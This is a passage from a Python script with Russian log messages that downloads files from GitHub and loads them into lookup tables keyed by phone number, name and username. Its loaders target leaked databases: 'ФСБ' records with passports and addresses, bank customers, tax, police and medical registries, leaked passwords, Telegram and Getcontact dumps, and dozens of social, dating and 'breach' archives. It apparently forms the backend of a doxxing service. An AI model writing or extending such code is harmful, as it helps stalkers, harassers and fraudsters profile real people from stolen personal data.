            log(f"[GitHub] OK {filename} ({os.path.getsize(local_path)} байт)")
        return local_path
    except Exception as e:
        log(f"[GitHub] Ошибка скачивания {filename}: {e}")
        return None


def parse_txt_file(filepath, line_parser):
    count = 0
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                if line_parser(line):
                    count += 1
    except Exception as e:
        log(f"[DB] Ошибка чтения {filepath}: {e}")
    return count


def parse_csv_file(filepath, row_parser, delimiter=","):
    count = 0
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            reader = csv.reader(f, delimiter=delimiter)
            for row in reader:
                if row_parser(row):
                    count += 1
    except Exception as e:
        log(f"[DB] Ошибка чтения CSV {filepath}: {e}")
    return count


def parse_excel_file(filepath, row_parser):
    count = 0
    try:
        wb = openpyxl.load_workbook(filepath, read_only=True, data_only=True)
        for ws in wb.worksheets:
            for row in ws.iter_rows(values_only=True):
                if row_parser(list(row)):
                    count += 1
        wb.close()
    except Exception as e:
        log(f"[DB] Ошибка чтения Excel {filepath}: {e}")
    return count


# ---------- Универсальные загрузчики ----------
def load_interbase_from_file(filepath, ext):
    global interbase_cache
    count = 0
    if ext == ".csv":
        def row_parser(row):
            nonlocal count
            if len(row) < 4:
                return False
            if len(row) >= 6:
                phone_idx = None
                for i, cell in enumerate(row):
                    norm = normalize_phone(str(cell))
                    if len(norm) == 11:
                        phone_idx = i
                        break
                if phone_idx is not None:
                    rec = {}
                    headers = ["Фамилия", "Имя", "Отчество", "Телефон", "Email", "Цена"]
                    for i, h in enumerate(headers):
                        if i < len(row):
                            rec[h] = str(row[i]).strip()
                    rec["Телефон"] = normalize_phone(rec.get("Телефон", ""))
                    if rec["Телефон"]:
                        interbase_cache[rec["Телефон"]] = rec
                        count += 1
                        return True
            return False
        parse_csv_file(filepath, row_parser, delimiter=";")
        if count == 0:
            parse_csv_file(filepath, row_parser, delimiter=",")
    log(f"[DB] Interbase: загружено {count} записей из {os.path.basename(filepath)}")


def load_getcontact_from_file(filepath):
    global getcontact_cache
    count = 0
    def line_parser(line):
        nonlocal count
        line = line.rstrip("\n").rstrip("\r")
        if not line.strip():
            return False
        parts = line.split(";")
        if len(parts) < 2:
            return False
        phone = normalize_phone(parts[0].strip())
        if not phone or len(phone) != 11:
            return False
        names = []
        for col in parts[1:]:
            col = col.strip()
            if not col or col.upper() == "NULL" or not col.startswith("["):
                continue
            try:
                parsed = json.loads(col)
                if isinstance(parsed, list) and parsed:
                    names = parsed
                    break
            except Exception:
                found = re.findall(r'"([^"]+)"', col)
                if found:
                    names = found
                    break
        if names:
            getcontact_cache[phone] = names
            count += 1
            return True
        return False
    parse_txt_file(filepath, line_parser)
    log(f"[DB] Getcontact: загружено {count} записей из {os.path.basename(filepath)}")


def load_telegram_from_file(filepath):
    global tg_db_by_id, tg_db_by_username, tg_db_by_phone, tg_db_by_name
    TELEGRAM_LINE_RE = re.compile(
        r"ID:\s*\[(\d+)\]\s*N:\[(.*?)\]\s*U\[\s*@?\s*(.*?)\s*\]\s*TEL:\[(.*?)\]",
        re.DOTALL,
    )
    count = 0
    def line_parser(line):
        nonlocal count
        line = line.strip()
        if not line or not line.startswith("ID:"):
            return False
        m = TELEGRAM_LINE_RE.search(line)
        if not m:
            return False
        tg_id = m.group(1).strip()
        name = m.group(2).strip()
        username = m.group(3).strip().lstrip("@")
        phone_raw = m.group(4).strip()
        rec = {"tg_id": tg_id, "name": name, "username": username, "phone": "", "raw": line}
        if phone_raw:
            norm = normalize_phone(phone_raw)
            if len(norm) == 11 and norm.startswith("7"):
                rec["phone"] = norm
            elif phone_raw.isdigit():
                rec["phone"] = phone_raw
        tg_db_by_id[tg_id] = rec
        if username:
            tg_db_by_username[username.lower()] = rec
        if rec["phone"]:
            tg_db_by_phone.setdefault(rec["phone"], []).append(rec)
        if name and len(name) > 1 and not name.isdigit():
            tg_db_by_name.setdefault(name.lower(), []).append(rec)
        count += 1
        return True
    parse_txt_file(filepath, line_parser)
    log(f"[DB] Telegram: загружено {count} записей из {os.path.basename(filepath)}")


def load_fsb_from_file(filepath):
    global fsb_cache, fsb_by_name
    def _parse_fsb_line(line):
        line = line.strip()
        if not line or line.startswith("Ф.И.О.") or line.startswith("ФИО"):
            return None
        line = re.sub(r"^\s*\d+\.\s*", "", line).rstrip(";").strip()
        if not line:
            return None
        parts = [p.strip() for p in line.split(",")]
        record = {
            "raw": line,
            "ФИО": parts[0] if len(parts) > 0 else "",
            "Дата рождения": parts[1] if len(parts) > 1 else "",
            "Место рождения / паспорт": parts[2] if len(parts) > 2 else "",
            "Дата выдачи": parts[3] if len(parts) > 3 else "",
            "Орган выдачи": parts[4] if len(parts) > 4 else "",
            "Адрес": parts[5] if len(parts) > 5 else "",
            "Прочее": ", ".join(parts[6:]) if len(parts) > 6 else "",
            "Phones": [],
        }
        for m in re.findall(r"\+?\d{11}", line):
            n = normalize_phone(m)
            if len(n) == 11 and n not in record["Phones"]:
                record["Phones"].append(n)
        for m in re.findall(r"MSISDN[:\s]*([+\d\s]+)", line):
            n = normalize_phone(m)
            if len(n) == 11 and n not in record["Phones"]:
                record["Phones"].append(n)
        return record

    count = 0
    def line_parser(line):
        nonlocal count
        rec = _parse_fsb_line(line)
        if not rec:
            return False
        name_key = rec["ФИО"].lower().strip()
        if name_key and len(name_key) > 3:
            fsb_by_name.setdefault(name_key, []).append(rec)
        for ph in rec["Phones"]:
            fsb_cache.setdefault(ph, []).append(rec)
        count += 1
        return True
    parse_txt_file(filepath, line_parser)
    log(f"[DB] ФСБ: загружено {count} записей из {os.path.basename(filepath)}")


def load_fsb_numbers_from_file(filepath):
    global fsb_numbers
    count = 0
    def row_parser(row):
        nonlocal count
        if not row:
            return False
        for cell in row:
            if cell is None:
                continue
            norm = normalize_phone(str(cell).strip())
            if len(norm) == 11 and norm.startswith("7"):
                labels = [str(c).strip() for c in row
                          if c is not None and str(c).strip()
                          and normalize_phone(str(c)) != norm]
                if labels:
                    fsb_numbers.setdefault(norm, []).extend(labels)
                    count += 1
                return True
        return False
    ext = os.path.splitext(filepath)[1].lower()
    if ext in (".xlsx", ".xls"):
        parse_excel_file(filepath, row_parser)
    log(f"[DB] ФСБ номера: загружено {count} записей из {os.path.basename(filepath)}")


def load_god_eye_from_file(filepath):
    global god_eye_by_phone, god_eye_by_username, god_eye_by_name
    count = 0
    def line_parser(line):
        nonlocal count
        line = line.strip()
        if not line:
            return False
        parts = line.split(",")
        if len(parts) < 3:
            return False
        rec = {
            "tg_id": parts[0].strip(),
            "phone": normalize_phone(parts[1].strip()),
            "username": parts[2].strip(),
            "first_name": parts[3].strip() if len(parts) > 3 else "",
            "last_name": parts[4].strip() if len(parts) > 4 else "",
            "raw": line,
        }
        if rec["phone"] and len(rec["phone"]) == 11:
            god_eye_by_phone.setdefault(rec["phone"], []).append(rec)
        if rec["username"]:
            god_eye_by_username[rec["username"].lower()] = rec
        for n in (rec["first_name"], rec["last_name"]):
            if n and len(n) > 2:
                god_eye_by_name.setdefault(n.lower(), []).append(rec)
        count += 1
        return True
    parse_txt_file(filepath, line_parser)
    log(f"[DB] God_eye: загружено {count} записей из {os.path.basename(filepath)}")


def load_facebook_from_file(filepath):
    global facebook_emails_cache, facebook_email_by_local
    count = 0
    email_re = re.compile(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+")
    def line_parser(line):
        nonlocal count
        line = line.strip()
        if not line:
            return False
        for email in email_re.findall(line):
            email = email.strip().lower()
            if len(email) < 6 or "@" not in email:
                continue
            local, _, domain = email.partition("@")
            if not local or not domain:
                continue
            rec = {"email": email, "local": local, "domain": domain,
                   "source": os.path.basename(filepath), "line": line[:500]}
            facebook_emails_cache[email] = rec
            facebook_email_by_local.setdefault(local, []).append(rec)
            count += 1
        return count > 0
    parse_txt_file(filepath, line_parser)
    log(f"[DB] Facebook Email: загружено {count} записей из {os.path.basename(filepath)}")


def load_simple_phone_db_from_file(filepath, ext, db_key):
    cache_map = {
        "sberbank": sberbank_cache, "tinkoff": tinkoff_cache,
        "vtb": vtb_cache, "alfabank": alfabank_cache,
        "gibdd": gibdd_cache, "fns": fns_cache,
        "pension": pension_cache, "mvd": mvd_cache,
        "fssp": fssp_cache, "rosreestr": rosreestr_cache,
        "avito": avito_cache, "wildberries": wildberries_cache,
        "ozon": ozon_cache, "yandex_eda": yandex_eda_cache,
        "vk": vk_cache, "ok": ok_cache,
        "mailru": mailru_cache, "yandex": yandex_cache, "gmail": gmail_cache,
        "leaked_passwords": leaked_passwords_cache,
        "dl": dl_cache, "medical": medical_cache,
        "education": education_cache, "military": military_cache,
    }
    cache = cache_map.get(db_key)
    if cache is None:
        return
    count = 0
    delimiter = ";" if ext == ".csv" else "\t"

    def _process_line(line):
        nonlocal count
        line = line.strip()
        if not line or line.startswith("#"):
            return False
        if ":" in line and ";" not in line:
            parts = line.split(":", 1)
            phone_raw, value = parts[0].strip(), parts[1].strip()
        else:
            parts = line.split(delimiter)
            if len(parts) < 2:
                return False
            phone_raw = parts[0].strip()
            value = delimiter.join(parts[1:]).strip()
        phone = normalize_phone(phone_raw)
        if not phone or len(phone) != 11:
            return False
        if value:
            cache.setdefault(phone, []).append(value)
            count += 1
            return True
        return False

    if ext in (".xlsx", ".xls"):
        def row_parser(row):
            nonlocal count
            if not row:
                return False
            for cell in row:
                if cell is None:
                    continue
                norm = normalize_phone(str(cell).strip())
                if len(norm) == 11 and norm.startswith("7"):
                    labels = [str(c).strip() for c in row
                              if c is not None and str(c).strip()
                              and normalize_phone(str(c)) != norm]
                    if labels:
                        cache.setdefault(norm, []).extend(labels)
                        count += 1
                    return True
            return False
        parse_excel_file(filepath, row_parser)
    elif ext == ".csv":
        def row_parser(row):
            nonlocal count
            if len(row) < 2:
                return False
            phone = normalize_phone(str(row[0]).strip())
            if not phone or len(phone) != 11:
                return False
            values = [str(c).strip() for c in row[1:] if str(c).strip()]
            if values:
                cache.setdefault(phone, []).extend(values)
                count += 1
                return True
            return False
        parse_csv_file(filepath, row_parser)
    else:
        parse_txt_file(filepath, _process_line)
    log(f"[DB] {db_key}: загружено {count} записей из {os.path.basename(filepath)}")


def load_generic_phone_from_file(filepath, ext):
    global generic_phone_cache
    count = 0
    filename = os.path.basename(filepath)

    def _extract_phone(text):
        if text is None:
            return None
        s = str(text).strip()
        digits = re.sub(r'\D', '', s)
        if len(digits) == 11 and digits.startswith('7'):
            return digits
        if len(digits) == 11 and digits.startswith('8'):
            return '7' + digits[1:]
        matches = re.findall(r'\+?7\d{10}|8\d{10}', s)
        if matches:
            return normalize_phone(matches[0])
        return None

    def _process_line(line):
        nonlocal count
        line = line.strip()
        if not line or line.startswith('#'):
            return False
        for sep in [';', ':', '\t', ',', '|']:
            if sep in line:
                parts = line.split(sep, 1)
                phone = _extract_phone(parts[0])
                if phone:
                    data = parts[1].strip() if len(parts) > 1 else ''
                    if data:
                        generic_phone_cache.setdefault(phone, []).append(f"[{filename}] {data}")
                        count += 1
                        return True
        phone = _extract_phone(line[:20])
        if phone:
            data = line[20:].strip(' ;:,|\t-')
            if data:
                generic_phone_cache.setdefault(phone, []).append(f"[{filename}] {data}")
                count += 1
                return True
        return False

    if ext in ('.xlsx', '.xls'):
        def row_parser(row):
            nonlocal count
            if not row:
                return False
            phone = None
            data_parts = []
            for cell in row:
                if cell is None:
                    continue
                cell_str = str(cell).strip()
                if not cell_str:
                    continue
                extracted = _extract_phone(cell_str)
                if extracted and not phone:
                    phone = extracted
                else:
                    data_parts.append(cell_str)
            if phone and data_parts:
                generic_phone_cache.setdefault(phone, []).append(
                    f"[{filename}] {' | '.join(data_parts)}")
                count += 1
                return True
            return False
        parse_excel_file(filepath, row_parser)
    elif ext == '.csv':
        def row_parser(row):
            nonlocal count
            if not row:
                return False
            phone = None
            data_parts = []
            for cell in row:
                cell_str = str(cell).strip()
                if not cell_str:
                    continue
                extracted = _extract_phone(cell_str)
                if extracted and not phone:
                    phone = extracted
                else:
                    data_parts.append(cell_str)
            if phone and data_parts:
                generic_phone_cache.setdefault(phone, []).append(
                    f"[{filename}] {' | '.join(data_parts)}")
                count += 1
                return True
            return False
        parse_csv_file(filepath, row_parser)
    else:
        parse_txt_file(filepath, _process_line)
    log(f"[DB] Generic phone: загружено {count} записей из {filename}")


def load_dump_phone_db(filepath, ext):
    global generic_phone_cache
    count = 0
    filename = os.path.basename(filepath)

    def _process(line):
        nonlocal count
        line = line.strip()
        if not line or line.startswith("#"):
            return False
        for sep in ["|", ";", "\t", ":", ","]:
            if sep in line:
                parts = line.split(sep)
                phone = normalize_phone(parts[0])
                if len(phone) == 11:
                    data = " | ".join(p.strip() for p in parts[1:] if p.strip())
                    if data:
                        generic_phone_cache.setdefault(phone, []).append(f"[{filename}] {data}")
                        count += 1
                        return True
        return False

    if ext in (".xlsx", ".xls"):
        def row_parser(row):
            nonlocal count
            if not row:
                return False
            for cell in row:
                if cell is None:
                    continue
                phone = normalize_phone(str(cell))
                if len(phone) == 11:
                    data = " | ".join(str(c).strip() for c in row
                                      if c is not None and str(c).strip()
                                      and normalize_phone(str(c)) != phone)
                    if data:
                        generic_phone_cache.setdefault(phone, []).append(f"[{filename}] {data}")
                        count += 1
                    return True
            return False
        parse_excel_file(filepath, row_parser)
    elif ext == ".csv":
        def row_parser(row):
            nonlocal count
            if len(row) < 2:
                return False
            phone = normalize_phone(row[0])
            if len(phone) != 11:
                return False
            data = " | ".join(str(c).strip() for c in row[1:] if str(c).strip())
            if data:
                generic_phone_cache.setdefault(phone, []).append(f"[{filename}] {data}")
                count += 1
                return True
            return False
        parse_csv_file(filepath, row_parser)
    else:
        parse_txt_file(filepath, _process)
    log(f"[DB] Dump: загружено {count} записей из {filename}")


def _load_social_archive(filepath, ext, cache_global_name, tag):
    cache = globals().get(cache_global_name)
    if cache is None:
        return
    count = 0
    filename = os.path.basename(filepath)

    def _process(line):
        nonlocal count
        line = line.strip()
        if not line:
            return False
        for sep in [";", "|", "\t", ","]:
            if sep in line:
                parts = line.split(sep)
                phone = normalize_phone(parts[0])
                if len(phone) == 11:
                    data = " | ".join(p.strip() for p in parts[1:] if p.strip())
                    if data:
                        cache.setdefault(phone, []).append(f"[{tag}/{filename}] {data}")
                        count += 1
                        return True
        return False

    if ext in (".xlsx", ".xls"):
        def row_parser(row):
            nonlocal count
            if not row:
                return False
            for cell in row:
                if cell is None:
                    continue
                phone = normalize_phone(str(cell))
                if len(phone) == 11:
                    data = " | ".join(str(c).strip() for c in row
                                      if c is not None and str(c).strip()
                                      and normalize_phone(str(c)) != phone)
                    if data:
                        cache.setdefault(phone, []).append(f"[{tag}/{filename}] {data}")
                        count += 1
                    return True
            return False
        parse_excel_file(filepath, row_parser)
    else:
        parse_txt_file(filepath, _process)
    log(f"[DB] {tag} archive: загружено {count} записей из {filename}")


def load_sber_archives(filepath, ext): _load_social_archive(filepath, ext, "sberbank_cache", "SberArch")
def load_vk_archives(filepath, ext): _load_social_archive(filepath, ext, "vk_cache", "VKArch")
def load_ok_archives(filepath, ext): _load_social_archive(filepath, ext, "ok_cache", "OKArch")
def load_mailru_archives(filepath, ext): _load_social_archive(filepath, ext, "mailru_cache", "MailruArch")
def load_linkedin_archives(filepath, ext): _load_social_archive(filepath, ext, "linkedin_cache", "LinkedIn")
def load_twitter_archives(filepath, ext): _load_social_archive(filepath, ext, "twitter_cache", "Twitter")
def load_instagram_archives(filepath, ext): _load_social_archive(filepath, ext, "instagram_cache", "Instagram")
def load_tiktok_archives(filepath, ext): _load_social_archive(filepath, ext, "tiktok_cache", "TikTok")
def load_yandex_archives(filepath, ext): _load_social_archive(filepath, ext, "yandex_cache", "Yandex")
def load_gmail_archives(filepath, ext): _load_social_archive(filepath, ext, "gmail_cache", "Gmail")
def load_steam_archives(filepath, ext): _load_social_archive(filepath, ext, "steam_cache", "Steam")
def load_discord_archives(filepath, ext): _load_social_archive(filepath, ext, "discord_cache", "Discord")
def load_tg_archives(filepath, ext): _load_social_archive(filepath, ext, "telegram_cache", "Telegram")
def load_wa_archives(filepath, ext): _load_social_archive(filepath, ext, "whatsapp_cache", "WhatsApp")
def load_viber_archives(filepath, ext): _load_social_archive(filepath, ext, "viber_cache", "Viber")
def load_signal_archives(filepath, ext): _load_social_archive(filepath, ext, "signal_cache", "Signal")
def load_tinder_archives(filepath, ext): _load_social_archive(filepath, ext, "tinder_cache", "Tinder")
def load_badoo_archives(filepath, ext): _load_social_archive(filepath, ext, "badoo_cache", "Badoo")
def load_twitch_archives(filepath, ext): _load_social_archive(filepath, ext, "twitch_cache", "Twitch")
def load_pinterest_archives(filepath, ext): _load_social_archive(filepath, ext, "pinterest_cache", "Pinterest")
def load_snapchat_archives(filepath, ext): _load_social_archive(filepath, ext, "snapchat_cache", "Snapchat")
def load_reddit_archives(filepath, ext): _load_social_archive(filepath, ext, "reddit_cache", "Reddit")
def load_tumblr_archives(filepath, ext): _load_social_archive(filepath, ext, "tumblr_cache", "Tumblr")
def load_spotify_archives(filepath, ext): _load_social_archive(filepath, ext, "spotify_cache", "Spotify")
def load_netflix_archives(filepath, ext): _load_social_archive(filepath, ext, "netflix_cache", "Netflix")
def load_telegram_phone_archives(filepath, ext): _load_social_archive(filepath, ext, "tg_db_by_phone", "TG-Phone")
def load_whatsapp_archives(filepath, ext): _load_social_archive(filepath, ext, "whatsapp_cache", "WhatsApp-Arch")
def load_signal_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "signal_cache", "Signal-Arch")
def load_viber_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "viber_cache", "Viber-Arch")
def load_line_archives(filepath, ext): _load_social_archive(filepath, ext, "generic_phone_cache", "LINE")
def load_kakaotalk_archives(filepath, ext): _load_social_archive(filepath, ext, "generic_phone_cache", "KakaoTalk")
def load_wechat_archives(filepath, ext): _load_social_archive(filepath, ext, "generic_phone_cache", "WeChat")
def load_qq_archives(filepath, ext): _load_social_archive(filepath, ext, "generic_phone_cache", "QQ")
def load_ok_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "ok_cache", "OK-Arch2")
def load_vk_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "vk_cache", "VK-Arch2")
def load_yandex_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "yandex_cache", "Yandex-Arch2")
def load_mailru_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "mailru_cache", "Mailru-Arch2")
def load_gmail_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "gmail_cache", "Gmail-Arch2")
def load_steam_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "steam_cache", "Steam-Arch2")
def load_discord_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "discord_cache", "Discord-Arch2")
def load_twitch_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "twitch_cache", "Twitch-Arch2")
def load_spotify_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "spotify_cache", "Spotify-Arch2")
def load_netflix_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "netflix_cache", "Netflix-Arch2")
def load_tinder_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "tinder_cache", "Tinder-Arch2")
def load_badoo_archives_v2(filepath, ext): _load_social_archive(filepath, ext, "badoo_cache", "Badoo-Arch2")
def load_avito_archives(filepath, ext): _load_social_archive(filepath, ext, "avito_cache", "Avito-Arch")
def load_wildberries_archives(filepath, ext): _load_social_archive(filepath, ext, "wildberries_cache", "WB-Arch")
def load_ozon_archives(filepath, ext): _load_social_archive(filepath, ext, "ozon_cache", "Ozon-Arch")
def load_yandex_music_archives(filepath, ext): _load_social_archive(filepath, ext, "yandex_music_cache", "YandexMusic")
def load_vk_music_archives(filepath, ext): _load_social_archive(filepath, ext, "vk_music_cache", "VKMusic")
def load_steam_db_archives(filepath, ext): _load_social_archive(filepath, ext, "steam_cache", "SteamDB")
def load_twitch_db_archives(filepath, ext): _load_social_archive(filepath, ext, "twitch_cache", "TwitchDB")
def load_discord_id_archives(filepath, ext): _load_social_archive(filepath, ext, "discord_cache", "DiscordID")


def _load_universal_extra(filepath, ext, cache_name, tag):
    cache = globals().get(cache_name)
    if cache is None:
        return
    count = 0
    filename = os.path.basename(filepath)

    def _process(line):
        nonlocal count
        line = line.strip()
        if not line or line.startswith("#"):
            return False
        for sep in [";", "|", "\t", ",", ":"]:
            if sep in line:
                parts = line.split(sep)
                phone = normalize_phone(parts[0])
                if len(phone) == 11:
                    data = " | ".join(p.strip() for p in parts[1:] if p.strip())
                    if data:
                        cache.setdefault(phone, []).append(f"[{tag}/{filename}] {data}")
                        count += 1
                        return True
        return False

    if ext in (".xlsx", ".xls"):
        def row_parser(row):
            nonlocal count
            if not row:
                return False
            for cell in row:
                if cell is None:
                    continue
                phone = normalize_phone(str(cell))
                if len(phone) == 11:
                    data = " | ".join(str(c).strip() for c in row
                                      if c is not None and str(c).strip()
                                      and normalize_phone(str(c)) != phone)
                    if data:
                        cache.setdefault(phone, []).append(f"[{tag}/{filename}] {data}")
                        count += 1
                    return True
            return False
        parse_excel_file(filepath, row_parser)
    elif ext == ".csv":
        def row_parser(row):
            nonlocal count
            if len(row) < 2:
                return False
            phone = normalize_phone(row[0])
            if len(phone) != 11:
                return False
            data = " | ".join(str(c).strip() for c in row[1:] if str(c).strip())
            if data:
                cache.setdefault(phone, []).append(f"[{tag}/{filename}] {data}")
                count += 1
                return True
            return False
        parse_csv_file(filepath, row_parser)
    else:
        parse_txt_file(filepath, _process)
    log(f"[DB] {tag}: {count} записей из {filename}")


def load_new_db_vk_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_vk_extra_cache", "VK-Extra")
def load_new_db_ok_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_ok_extra_cache", "OK-Extra")
def load_new_db_telegram_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_telegram_extra_cache", "TG-Extra")
def load_new_db_steam_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_steam_extra_cache", "Steam-Extra")
def load_new_db_bank_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_bank_extra_cache", "Bank-Extra")
def load_new_db_gov_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_gov_extra_cache", "Gov-Extra")
def load_new_db_leak_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_leak_extra_cache", "Leak-Extra")
def load_new_db_market_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_market_extra_cache", "Market-Extra")
def load_new_db_social_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_social_extra_cache", "Social-Extra")
def load_new_db_game_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_game_extra_cache", "Game-Extra")
def load_new_db_music_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_music_extra_cache", "Music-Extra")
def load_new_db_video_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_video_extra_cache", "Video-Extra")
def load_new_db_dating_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_dating_extra_cache", "Dating-Extra")
def load_new_db_edu_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_edu_extra_cache", "Edu-Extra")
def load_new_db_med_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_med_extra_cache", "Med-Extra")
def load_new_db_mil_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_mil_extra_cache", "Mil-Extra")
def load_new_db_fin_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_fin_extra_cache", "Fin-Extra")
def load_new_db_transport_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_transport_extra_cache", "Transport-Extra")
def load_new_db_realty_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_realty_extra_cache", "Realty-Extra")
def load_new_db_job_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_job_extra_cache", "Job-Extra")
def load_new_db_shop_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_shop_extra_cache", "Shop-Extra")
def load_new_db_travel_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_travel_extra_cache", "Travel-Extra")
def load_new_db_insurance_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_insurance_extra_cache", "Insurance-Extra")
def load_new_db_telecom_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_telecom_extra_cache", "Telecom-Extra")
def load_new_db_isp_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_isp_extra_cache", "ISP-Extra")
def load_new_db_auto_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_auto_extra_cache", "Auto-Extra")
def load_new_db_pets_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_pets_extra_cache", "Pets-Extra")
def load_new_db_charity_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_charity_extra_cache", "Charity-Extra")
def load_new_db_religion_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_religion_extra_cache", "Religion-Extra")
def load_new_db_politics_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_politics_extra_cache", "Politics-Extra")
def load_new_db_military_extra2(fp, ext): _load_universal_extra(fp, ext, "new_db_military_extra2_cache", "Mil-Extra2")
def load_new_db_cyber_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_cyber_extra_cache", "Cyber-Extra")
def load_new_db_darknet_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_darknet_extra_cache", "Darknet-Extra")
def load_new_db_breach_extra(fp, ext): _load_universal_extra(fp, ext, "new_db_breach_extra_cache", "Breach-Extra")


# ================== ЗАГРУЗКА БАЗ ==================
def load_dynamic_databases():
    log("[DB] Начинаю динамическую загрузку баз данных с GitHub...")
    files = get_github_files()
    if not files:
        log("[DB] Не удалось получить список файлов с GitHub!")
        return
    log(f"[DB] Найдено файлов: {len(files)}")
    for filename in files:
        fname_lower = filename.lower()
        if fname_lower.endswith('.zip'):
            log(f"[DB] Пропускаю архив: {filename}")
            continue
        local_path = download_file_from_github(filename)
        if not local_path:
            continue
        ext = os.path.splitext(filename)[1].lower()
        # Простая классификация по имени
        if "interbase" in fname_lower:
            load_interbase_from_file(local_path, ext)
        elif "getcontact" in fname_lower:
            load_getcontact_from_file(local_path)
        elif "telegram" in fname_lower and "arch" not in fname_lower:
            load_telegram_from_file(local_path)
        elif "фсб" in fname_lower and "номера" in fname_lower:
            load_fsb_numbers_from_file(local_path)
        elif "фсб" in fname_lower or "fsb" in fname_lower:
            load_fsb_from_file(local_path)
        elif "god_eye" in fname_lower or "god eye" in fname_lower:
            load_god_eye_from_file(local_path)
        elif "facebook" in fname_lower and ("email" in fname_lower or "list" in fname_lower):
            load_facebook_from_file(local_path)
        elif fname_lower == "facebook.txt":
            load_facebook_from_file(local_path)
        elif "vk_arch" in fname_lower:
            load_vk_archives(local_path, ext)
        elif "ok_arch" in fname_lower:
            load_ok_archives(local_path, ext)
        elif "mailru_arch" in fname_lower:
            load_mailru_archives(local_path, ext)
        elif "yandex_arch" in fname_lower:
            load_yandex_archives(local_path, ext)
        elif "gmail_arch" in fname_lower:
            load_gmail_archives(local_path, ext)
        elif "steam" in fname_lower:
            load_steam_archives(local_path, ext)
        elif "discord" in fname_lower:
            load_discord_archives(local_path, ext)
        elif "twitch" in fname_lower:
            load_twitch_archives(local_path, ext)
        elif "spotify" in fname_lower:
            load_spotify_archives(local_path, ext)
        elif "netflix" in fname_lower:
            load_netflix_archives(local_path, ext)
        elif "tinder" in fname_lower:
            load_tinder_archives(local_path, ext)
        elif "badoo" in fname_lower:
            load_badoo_archives(local_path, ext)
        elif "pinterest" in fname_lower:
            load_pinterest_archives(local_path, ext)
        elif "snapchat" in fname_lower:
            load_snapchat_archives(local_path, ext)
        elif "reddit" in fname_lower:
            load_reddit_archives(local_path, ext)
        elif "tumblr" in fname_lower:
            load_tumblr_archives(local_path, ext)
        elif "tiktok" in fname_lower:
            load_tiktok_archives(local_path, ext)
        elif "instagram" in fname_lower:
            load_instagram_archives(local_path, ext)
        elif "twitter" in fname_lower:
            load_twitter_archives(local_path, ext)
        elif "linkedin" in fname_lower:
            load_linkedin_archives(local_path, ext)
        elif "vk_extra" in fname_lower:
            load_new_db_vk_extra(local_path, ext)
        elif "ok_extra" in fname_lower:
            load_new_db_ok_extra(local_path, ext)
        elif "tg_extra" in fname_lower:
            load_new_db_telegram_extra(local_path, ext)
        elif "steam_extra" in fname_lower:
            load_new_db_steam_extra(local_path, ext)
        elif "bank_extra" in fname_lower:
            load_new_db_bank_extra(local_path, ext)
        elif "gov_extra" in fname_lower:
            load_new_db_gov_extra(local_path, ext)
        elif "leak_extra" in fname_lower:
            load_new_db_leak_extra(local_path, ext)
        elif "market_extra" in fname_lower:
            load_new_db_market_extra(local_path, ext)
        elif "social_extra" in fname_lower:
            load_new_db_social_extra(local_path, ext)
        elif "game_extra" in fname_lower:
            load_new_db_game_extra(local_path, ext)
        elif "music_extra" in fname_lower:
            load_new_db_music_extra(local_path, ext)
        elif "video_extra" in fname_lower:
            load_new_db_video_extra(local_path, ext)
        elif "dating_extra" in fname_lower:
            load_new_db_dating_extra(local_path, ext)
        elif "edu_extra" in fname_lower:
            load_new_db_edu_extra(local_path, ext)
        elif "med_extra" in fname_lower:
            load_new_db_med_extra(local_path, ext)
        elif "mil_extra" in fname_lower:
            load_new_db_mil_extra(local_path, ext)
        elif "fin_extra" in fname_lower:
            load_new_db_fin_extra(local_path, ext)
        elif "transport_extra" in fname_lower:
            load_new_db_transport_extra(local_path, ext)
        elif "realty_extra" in fname_lower:
            load_new_db_realty_extra(local_path, ext)
        elif "job_extra" in fname_lower:
            load_new_db_job_extra(local_path, ext)
        elif "shop_extra" in fname_lower:
            load_new_db_shop_extra(local_path, ext)
        elif "travel_extra" in fname_lower:
            load_new_db_travel_extra(local_path, ext)
        elif "insurance_extra" in fname_lower:
